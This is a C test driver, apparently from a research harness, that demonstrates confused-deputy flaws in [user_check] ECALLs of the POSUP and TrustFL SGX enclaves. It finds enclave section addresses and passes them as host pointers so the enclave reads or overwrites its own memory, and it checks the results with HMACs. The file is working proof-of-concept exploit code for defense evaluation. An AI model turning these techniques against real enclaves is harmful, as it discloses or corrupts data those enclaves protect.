/* Direct [user_check] confused-deputy control for the selected POSUP and
 * TrustFL ECALLs.
 *
 * POSUP (Enclave/Enclave.edl:18,48):
 *   public void ecall_getPathID([user_check] TYPE_ID* output);
 *   public void ecall_setFileIDs([user_check] unsigned char* fid_arr,
 *                                int num_fileIDs);
 *   *output = pathID;                                  prepared/Enclave.cpp:10
 *   memcpy(&tmp, &fid_arr[i*sizeof(TYPE_ID)], 4);      prepared/Enclave.cpp:19
 *
 * TrustFL (Enclave/Enclave.edl:17):
 *   public int ecall_data_preprocess([user_check] unsigned char* p_datau, ...,
 *                                    [user_check] unsigned char* p_labelu, ...,
 *                                    unsigned long p_training_hmacu);
 *   memcpy(p_data_label, p_datau, rows*columns);        prepared/Enclave.cpp:40
 *   p_data_label[rows*columns] = *p_labelu;             prepared/Enclave.cpp:41
 *   p_hmacu[i] = temp;                                 prepared/Enclave.cpp:45
 *
 * [user_check] passes the host-chosen raw pointer with no bridge copy, length,
 * null, canonical or outside-enclave check, and the upstream bodies do not
 * validate it.  This driver therefore names addresses inside the loaded
 * enclave image:
 *
 *   control        the unchanged ECALLs with host buffers only.  Must pass in
 *                  every profile.
 *   cd-read        the enclave reads enclave memory through the raw pointer:
 *                  POSUP setFileIDs from a stable .data word pair (returned by
 *                  the test observation ECALL); TrustFL takes its 60,000 label
 *                  bytes from the image .text and every HMAC is checked.
 *   cd-write       the enclave writes to enclave memory through the raw
 *                  pointer: POSUP getPathID stores pathID over a .data word;
 *                  TrustFL writes 60,000 HMACs (1,920,000 bytes) to a mapped
 *                  span inside the enclave extent.
 *   cd-read-data   TrustFL only: the 60,000-record training-data loop reads
 *                  from image .text.  It faults at the end of the mapped image
 *                  after writing the completed HMACs to a host buffer; a child
 *                  process isolates the fault and the parent checks the HMACs
 *                  against the enclave bytes it copied out first.
 *
 * Targets are taken from the image's own section table or the loaded mapping
 * table and checked against /proc/self/maps after sgx_create_enclave.  No fixed
 * scratch offset is assumed.  Direct host reads of the target are SIM
 * observations only; they are used to check the BASELINE store.
 */
#include <elf.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <unistd.h>
#include <openssl/hmac.h>
#include "sgx_urts.h"
#include "Enclave_u.h"
#include "../four_app_permissions.h"

__attribute__((noinline)) void posup_trustfl_cd_ready(void)
{
    __asm__ volatile("" ::: "memory");
}

void ocall_print(const char *message) { fprintf(stderr, "%s\n", message); }

static int perm_of(uintptr_t start, size_t len, int want_write)
{
    FILE *maps = fopen("/proc/self/maps", "r");
    if (!maps) return 0;
    char line[512];
    int found = 0;
    while (fgets(line, sizeof line, maps)) {
        unsigned long lo, hi; char perm[5];
        if (sscanf(line, "%lx-%lx %4s", &lo, &hi, perm) == 3 &&
            start >= lo && (uintptr_t)len <= hi - start &&
            perm[0] == 'r' && (!want_write || perm[1] == 'w')) {
            found = 1;
            break;
        }
    }
    fclose(maps);
    return found;
}

static int mapped_rw(uintptr_t start, size_t len)
{
    return perm_of(start, len, 1);
}

/* End of the contiguous readable range that contains `address`.  A 47 MB
 * TrustFL training-data read runs off the mapped image at this boundary. */
static __attribute__((unused)) uintptr_t readable_end(uintptr_t address)
{
    enum { MAX = 512 };
    struct { uintptr_t lo, hi; int readable; } map[MAX];
    size_t count = 0;
    FILE *maps = fopen("/proc/self/maps", "r");
    if (!maps) return 0;
    char line[512];
    while (fgets(line, sizeof line, maps) && count < MAX) {
        unsigned long lo, hi; char perm[5];
        if (sscanf(line, "%lx-%lx %4s", &lo, &hi, perm) != 3) continue;
        map[count].lo = lo; map[count].hi = hi;
        map[count].readable = perm[0] == 'r';
        ++count;
    }
    fclose(maps);
    uintptr_t end = 0;
    for (size_t i = 0; i < count; ++i)
        if (address >= map[i].lo && address < map[i].hi && map[i].readable)
            end = map[i].hi;
    if (!end) return 0;
    for (int grew = 1; grew;) {
        grew = 0;
        for (size_t i = 0; i < count; ++i) {
            if (!map[i].readable) continue;
            if (map[i].lo <= end && map[i].hi > end) { end = map[i].hi; grew = 1; }
        }
    }
    return end;
}

static int find_section(const char *image, const char *want, uint64_t *addr,
                        uint64_t *size)
{
    FILE *f = fopen(image, "rb");
    if (!f) return 0;
    Elf64_Ehdr eh;
    if (fread(&eh, 1, sizeof eh, f) != sizeof eh || eh.e_shnum == 0 ||
        eh.e_shentsize != sizeof(Elf64_Shdr) ||
        memcmp(eh.e_ident, ELFMAG, SELFMAG) != 0) {
        fclose(f); return 0;
    }
    Elf64_Shdr *sh = calloc(eh.e_shnum, sizeof(*sh));
    if (!sh ||
        fseek(f, (long)eh.e_shoff, SEEK_SET) != 0 ||
        fread(sh, sizeof(*sh), eh.e_shnum, f) != eh.e_shnum ||
        eh.e_shstrndx >= eh.e_shnum) {
        free(sh); fclose(f); return 0;
    }
    char *names = malloc(sh[eh.e_shstrndx].sh_size);
    if (!names ||
        fseek(f, (long)sh[eh.e_shstrndx].sh_offset, SEEK_SET) != 0 ||
        fread(names, 1, sh[eh.e_shstrndx].sh_size, f) !=
            sh[eh.e_shstrndx].sh_size) {
        free(names); free(sh); fclose(f); return 0;
    }
    int found = 0;
    for (unsigned i = 0; i < eh.e_shnum; ++i) {
        if (strcmp(names + sh[i].sh_name, want) != 0) continue;
        if (!(sh[i].sh_flags & SHF_ALLOC)) break;
        *addr = sh[i].sh_addr;
        *size = sh[i].sh_size;
        found = 1;
        break;
    }
    free(names); free(sh); fclose(f);
    return found;
}


/* Start of the first writable image section.  Live application globals below
 * this boundary can change during an ECALL, so the verified prefix stops
 * there. */
static __attribute__((unused)) int first_writable_section(const char *image, uint64_t *addr)
{
    FILE *f = fopen(image, "rb");
    if (!f) return 0;
    Elf64_Ehdr eh;
    if (fread(&eh, 1, sizeof eh, f) != sizeof eh || eh.e_shnum == 0 ||
        eh.e_shentsize != sizeof(Elf64_Shdr)) {
        fclose(f); return 0;
    }
    Elf64_Shdr *sh = calloc(eh.e_shnum, sizeof(*sh));
    if (!sh || fseek(f, (long)eh.e_shoff, SEEK_SET) != 0 ||
        fread(sh, sizeof(*sh), eh.e_shnum, f) != eh.e_shnum) {
        free(sh); fclose(f); return 0;
    }
    int found = 0;
    uint64_t best = 0;
    for (unsigned i = 0; i < eh.e_shnum; ++i) {
        if (!(sh[i].sh_flags & SHF_ALLOC) || !(sh[i].sh_flags & SHF_WRITE) ||
            sh[i].sh_size == 0)
            continue;
        if (!found || sh[i].sh_addr < best) { best = sh[i].sh_addr; found = 1; }
    }
    free(sh); fclose(f);
    if (found) *addr = best;
    return found;
}
/* Largest read-write mapping fully inside the declared enclave extent.  Used
 * as the 1,920,000-byte TrustFL output span; the reserved-memory mapping is the
 * only mapping that large. */
static __attribute__((unused)) int find_span(uintptr_t base, uintptr_t extent,
                     size_t span, uintptr_t *target)
{
    FILE *maps = fopen("/proc/self/maps", "r");
    if (!maps) return 0;
    char line[512];
    uintptr_t best_lo = 0, best_hi = 0;
    while (fgets(line, sizeof line, maps)) {
        unsigned long lo, hi; char perm[5], rest[8];
        if (sscanf(line, "%lx-%lx %4s %7s", &lo, &hi, perm, rest) != 4)
            continue;
        if (perm[0] != 'r' || perm[1] != 'w' || perm[2] == 'x') continue;
        if (lo < base || hi > base + extent || hi - lo < span) continue;
        if (hi - lo > best_hi - best_lo) { best_lo = lo; best_hi = hi; }
    }
    fclose(maps);
    if (!best_lo) return 0;
    uintptr_t t = (best_hi - span) & ~(uintptr_t)31;
    if (t < best_lo || !mapped_rw(t, span)) return 0;
    *target = t;
    return 1;
}

/* Skip the first two .data words: the SDK's g_is_first_ecall flag is cleared
 * by the first ECALL, and the neighbouring word is zero.  The version-string
 * words at +0x10 are stable image data for every ECALL. */
#define DATA_OFFSET 0x10

static __attribute__((unused)) int cmp_int(const void *a, const void *b)
{
    int x = *(const int *)a, y = *(const int *)b;
    return (x > y) - (x < y);
}

#ifdef APP_POSUP
/* Test-observation ECALL added by prepare.py; it copies the selected
 * application-owned set to an ordinary bridged buffer. */
static int read_enclave_words(sgx_enclave_id_t eid, uintptr_t target, int n,
                              int *out, int capacity)
{
    int got = -1;
    sgx_status_t s = ecall_setFileIDs(eid, (unsigned char *)target, n);
    if (s) { fprintf(stderr, "setFileIDs=%#x\n", (unsigned)s); exit(20); }
    s = diagnostic_fileids(eid, &got, out, capacity);
    if (s) { fprintf(stderr, "diagnostic=%#x\n", (unsigned)s); exit(20); }
    if (got < 0 || got > capacity) { fprintf(stderr, "count=%d\n", got); exit(20); }
    return got;
}

static int expected_words(uintptr_t target, int n, int *out)
{
    int values[16], uniq = 0;
    for (int i = 0; i < n; ++i) {
        int v = *(volatile int32_t *)(target + (uintptr_t)i * 4);
        if (v < 0) v = (int)(0u - (uint32_t)v);
        values[i] = v;
    }
    qsort(values, (size_t)n, sizeof(int), cmp_int);
    for (int i = 0; i < n; ++i)
        if (!uniq || values[i] != values[uniq - 1]) values[uniq++] = values[i];
    memcpy(out, values, (size_t)uniq * sizeof(int));
    return uniq;
}

static void words_text(int *v, int n, char *buf, size_t size)
{
    size_t used = 0;
    buf[0] = 0;
    for (int i = 0; i < n && used + 24 < size; ++i)
        used += (size_t)snprintf(buf + used, size - used, "%s%d",
                                 i ? "," : "", v[i]);
}
#endif

#ifdef APP_TRUSTFL
enum { RECORDS = 60000, PIXELS = 784, MAC = 32, KEY = 128, SPAN = RECORDS * MAC };

static void make_input(unsigned char *data, unsigned char *labels)
{
    memset(data, 0x55, 16); memset(labels, 0x66, 8);
    for (int i = 0; i < RECORDS; ++i) {
        for (int j = 0; j < PIXELS; ++j)
            data[16 + (size_t)i * PIXELS + j] =
                (unsigned char)(j * 7 + (i % 3) * 11);
        labels[8 + i] = (unsigned char)(i % 3);
    }
}

static int check_record(const unsigned char *message, size_t length,
                        const unsigned char *got)
{
    unsigned char key[KEY] = {0}, want[MAC];
    unsigned int len = 0;
    if (!HMAC(EVP_sha256(), key, sizeof(key), message, length, want, &len) ||
        len != MAC)
        return 0;
    return !memcmp(want, got, MAC);
}

/* Check HMAC record i against the 784-byte training record and one label byte.
 * The key is the upstream zero-initialized key because every check in this
 * driver runs before ecall_init. */
static int verify_records(const unsigned char *data, const unsigned char *labels,
                          const unsigned char *macs, int n, int *failed)
{
    unsigned char message[PIXELS + 1];
    *failed = -1;
    for (int i = 0; i < n; ++i) {
        memcpy(message, data + (size_t)i * PIXELS, PIXELS);
        message[PIXELS] = labels[i];
        if (!check_record(message, sizeof message, macs + (size_t)i * MAC)) {
            *failed = i;
            return 0;
        }
    }
    return 1;
}

static void preprocess(sgx_enclave_id_t eid, unsigned char *data,
                       unsigned char *labels, unsigned long output)
{
    int result = 99;
    sgx_status_t s = ecall_data_preprocess(eid, &result, data,
        (unsigned int)(16 + (size_t)RECORDS * PIXELS), labels,
        (unsigned int)(8 + RECORDS), output);
    if (s || result != 0) {
        fprintf(stderr, "data_preprocess=%#x result=%d\n", (unsigned)s, result);
        exit(20);
    }
}

/* TrustFL training-data read: the enclave reads PIXELS bytes per record from
 * the host-chosen pointer for RECORDS records.  From image .text that span runs
 * past the mapped image and faults.  The child owns the fault; the parent
 * checks every HMAC that was produced first. */
struct shared {
    volatile size_t complete;
    unsigned char bytes[(size_t)RECORDS * PIXELS];
    unsigned char macs[SPAN];
};

static int read_data_mode(const char *image, uintptr_t base, uint64_t saddr)
{
    uintptr_t target = base + saddr;
    struct shared *sh = mmap(NULL, sizeof *sh, PROT_READ | PROT_WRITE,
                             MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (sh == MAP_FAILED) return 6;
    pid_t pid = fork();
    if (pid < 0) return 6;
    if (pid == 0) {
        sgx_enclave_id_t eid = 0;
        if (sgx_create_enclave(image, SGX_DEBUG_FLAG, NULL, NULL, &eid, NULL))
            _exit(30);
        unsigned char *data = malloc(16 + (size_t)RECORDS * PIXELS);
        unsigned char *labels = malloc(8 + RECORDS);
        unsigned char *warm = malloc(SPAN);
        if (!data || !labels || !warm) _exit(32);
        make_input(data, labels);
        /* Complete the SDK's first-ECALL global-constructor pass with a
         * host-buffer call, so the bytes copied below are the ones the attack
         * will read.  The zero key is unchanged (ecall_init is not called). */
        preprocess(eid, data, labels, (unsigned long)(uintptr_t)warm);
        free(warm);
        uintptr_t end = readable_end(target);
        uint64_t writable = 0;
        if (first_writable_section(image, &writable) &&
            base + writable < end)
            end = base + writable;
        if (!end || end <= target) _exit(31);
        size_t complete = (size_t)(end - target) / PIXELS;
        if (complete > RECORDS) complete = RECORDS;
        memcpy(sh->bytes, (const void *)target, complete * PIXELS);
        sh->complete = complete;
        int result = 99;
        /* p_datau is advanced by 16 inside the body. */
        ecall_data_preprocess(eid, &result, (unsigned char *)(target - 16),
            (unsigned int)(16 + (size_t)RECORDS * PIXELS), labels,
            (unsigned int)(8 + RECORDS), (unsigned long)(uintptr_t)sh->macs);
        _exit(0);
    }
    int status = 0;
    if (waitpid(pid, &status, 0) != pid) return 6;
    int child_signal = WIFSIGNALED(status) ? WTERMSIG(status) : 0;
    if (child_signal == SIGILL) {
        /* Protected profiles reject the first enclave read; keep the same
         * process-level SIGILL result as the other cd modes. */
        signal(SIGILL, SIG_DFL);
        raise(SIGILL);
        return 120;
    }
    size_t complete = sh->complete > RECORDS ? RECORDS : sh->complete;
    unsigned char *data = malloc(16 + (size_t)RECORDS * PIXELS);
    unsigned char *labels = malloc(8 + RECORDS);
    if (!data || !labels) return 6;
    make_input(data, labels);
    int failed = -1;
    if (!verify_records(sh->bytes, labels + 8, sh->macs, (int)complete,
                        &failed)) {
        fprintf(stderr, "cd-read-data record %d\n", failed);
        return 21;
    }
    printf("{\"mode\":\"cd-read-data\",\"status\":0,\"target\":\"%#lx\","
           "\"verified_records\":%zu,\"read_bytes\":%zu,"
           "\"child_signal\":%d,\"macs\":\"PASS\"}\n",
           (unsigned long)target, complete, complete * PIXELS, child_signal);
    return 0;
}
#endif

int main(int argc, char **argv)
{
    if (argc != 3) {
        fprintf(stderr, "usage: %s <enclave.signed.so> "
                        "<control|cd-read|cd-write|cd-read-data>\n", argv[0]);
        return 2;
    }
    const char *image = argv[1];
    const char *mode = argv[2];
    int control = !strcmp(mode, "control");
    int cd_read = !strcmp(mode, "cd-read");
    int cd_write = !strcmp(mode, "cd-write");
    int cd_read_data =
#ifdef APP_TRUSTFL
        !strcmp(mode, "cd-read-data");
#else
        0;
#endif
    if (!control && !cd_read && !cd_write && !cd_read_data) {
        fprintf(stderr, "unknown mode: %s\n", mode);
        return 2;
    }

    uintptr_t base = 0x40000000;
    if (getenv("ENCBOUND_TEST_BASE"))
        base = strtoull(getenv("ENCBOUND_TEST_BASE"), NULL, 0);

    uint64_t saddr = 0, ssize = 0;
#ifdef APP_TRUSTFL
    if (cd_read_data) {
        if (!find_section(image, ".text", &saddr, &ssize) || ssize < PIXELS) {
            fprintf(stderr, "cannot find .text in %s\n", image);
            return 4;
        }
        return read_data_mode(image, base, saddr);
    }
#endif
    if (cd_read || cd_write) {
#ifdef APP_POSUP
        if (!find_section(image, ".data", &saddr, &ssize) || ssize < DATA_OFFSET + 8) {
            fprintf(stderr, "cannot find .data in %s\n", image);
            return 4;
        }
        saddr += DATA_OFFSET;
#endif
    }
#ifdef APP_TRUSTFL
    if (cd_read) {
        if (!find_section(image, ".text", &saddr, &ssize) || ssize < RECORDS) {
            fprintf(stderr, "cannot find .text in %s\n", image);
            return 4;
        }
    }
#endif

    sgx_enclave_id_t eid = 0;
    sgx_status_t status = sgx_create_enclave(image, SGX_DEBUG_FLAG, NULL, NULL,
                                             &eid, NULL);
    if (status) { fprintf(stderr, "create=%#x\n", (unsigned)status); return 3; }
    four_app_permissions(image);
    posup_trustfl_cd_ready();

    uintptr_t target = base + saddr;
#ifdef APP_POSUP
    if ((cd_read || cd_write) && !mapped_rw(target, 8)) {
        fprintf(stderr, "target %#lx is not mapped rw\n", (unsigned long)target);
        return 5;
    }
#endif

#ifdef APP_POSUP
    if (control) {
        TYPE_ID path = -1;
        unsigned char input[8];
        int source[2] = {3, -3};
        memcpy(input, source, sizeof input);
        if (ecall_getPathID(eid, &path) || path != 0) {
            fprintf(stderr, "control getPathID=%d\n", path); return 21;
        }
        int values[16] = {0}, expected[16], got, want;
        got = read_enclave_words(eid, (uintptr_t)input, 2, values, 16);
        want = expected_words((uintptr_t)input, 2, expected);
        if (got != want || memcmp(values, expected, (size_t)want * sizeof(int))) {
            fprintf(stderr, "control setFileIDs mismatch\n"); return 21;
        }
        printf("{\"mode\":\"control\",\"status\":0,\"getPathID\":%d,"
               "\"words\":%d,\"readback\":\"PASS\"}\n", path, got);
        return 0;
    }
    if (cd_read) {
        int values[16] = {0}, expected[16], got, want;
        char seen[128], oracle[128];
        got = read_enclave_words(eid, target, 2, values, 16);
        want = expected_words(target, 2, expected);
        words_text(values, got, seen, sizeof seen);
        words_text(expected, want, oracle, sizeof oracle);
        if (got != want || want < 1 || expected[want - 1] == 0 ||
            memcmp(values, expected, (size_t)want * sizeof(int))) {
            fprintf(stderr, "cd-read mismatch seen=%s expected=%s\n", seen, oracle);
            return 21;
        }
        printf("{\"mode\":\"cd-read\",\"status\":0,\"target\":\"%#lx\","
               "\"words\":\"%s\",\"oracle\":\"%s\",\"readback\":\"PASS\"}\n",
               (unsigned long)target, seen, oracle);
        return 0;
    }
    if (cd_write) {
        int before = *(volatile int32_t *)target;
        int neighbor = *(volatile int32_t *)(target + 4);
        if (ecall_getPathID(eid, (TYPE_ID *)target)) {
            fprintf(stderr, "cd-write getPathID transport failure\n"); return 20;
        }
        int after = *(volatile int32_t *)target;
        int neighbor_after = *(volatile int32_t *)(target + 4);
        if (before == 0 || after != 0 || neighbor_after != neighbor) {
            fprintf(stderr, "cd-write before=%d after=%d neighbor=%d/%d\n",
                    before, after, neighbor, neighbor_after);
            return 21;
        }
        printf("{\"mode\":\"cd-write\",\"status\":0,\"target\":\"%#lx\","
               "\"before\":%d,\"after\":%d,\"neighbor\":%d,"
               "\"write\":\"PASS\"}\n",
               (unsigned long)target, before, after, neighbor);
        return 0;
    }
#endif

#ifdef APP_TRUSTFL
    size_t data_size = 16 + (size_t)RECORDS * PIXELS;
    size_t label_size = 8 + RECORDS;
    unsigned char *data = malloc(data_size), *labels = malloc(label_size);
    if (!data || !labels) return 6;
    make_input(data, labels);

    if (control) {
        unsigned char *macs = malloc(SPAN);
        if (!macs) return 6;
        preprocess(eid, data, labels, (unsigned long)(uintptr_t)macs);
        int failed;
        if (!verify_records(data + 16, labels + 8, macs, RECORDS, &failed)) {
            fprintf(stderr, "control record %d\n", failed); return 21;
        }
        printf("{\"mode\":\"control\",\"status\":0,\"records\":%d,"
               "\"macs\":\"PASS\"}\n", RECORDS);
        return 0;
    }
    if (cd_read) {
        /* p_labelu is advanced by 8 inside the body; pass target-8 so the
         * first label byte comes from image .text. */
        unsigned char *macs = malloc(SPAN);
        if (!macs) return 6;
        if (!perm_of(target, RECORDS, 0)) {
            fprintf(stderr, "label span %#lx+%d is not readable\n",
                    (unsigned long)target, RECORDS);
            return 5;
        }
        preprocess(eid, data, (unsigned char *)(target - 8),
                   (unsigned long)(uintptr_t)macs);
        int failed;
        if (!verify_records(data + 16, (const unsigned char *)target, macs,
                            RECORDS, &failed)) {
            fprintf(stderr, "cd-read record %d\n", failed); return 21;
        }
        printf("{\"mode\":\"cd-read\",\"status\":0,\"target\":\"%#lx\","
               "\"label_bytes\":%d,\"records\":%d,\"macs\":\"PASS\"}\n",
               (unsigned long)target, RECORDS, RECORDS);
        return 0;
    }
    if (cd_write) {
        /* The host names an enclave-internal span as the HMAC output. */
        uintptr_t span = 0;
        if (!find_span(base, 0x4000000, SPAN, &span)) {
            fprintf(stderr, "no %d-byte rw span inside the enclave extent\n", SPAN);
            return 4;
        }
        preprocess(eid, data, labels, (unsigned long)span);
        int failed;
        if (!verify_records(data + 16, labels + 8,
                            (const unsigned char *)span, RECORDS, &failed)) {
            fprintf(stderr, "cd-write record %d\n", failed); return 21;
        }
        printf("{\"mode\":\"cd-write\",\"status\":0,\"target\":\"%#lx\","
               "\"bytes\":%d,\"records\":%d,\"macs\":\"PASS\"}\n",
               (unsigned long)span, SPAN, RECORDS);
        return 0;
    }
#endif
    fprintf(stderr, "unhandled mode %s\n", mode);
    return 2;
}
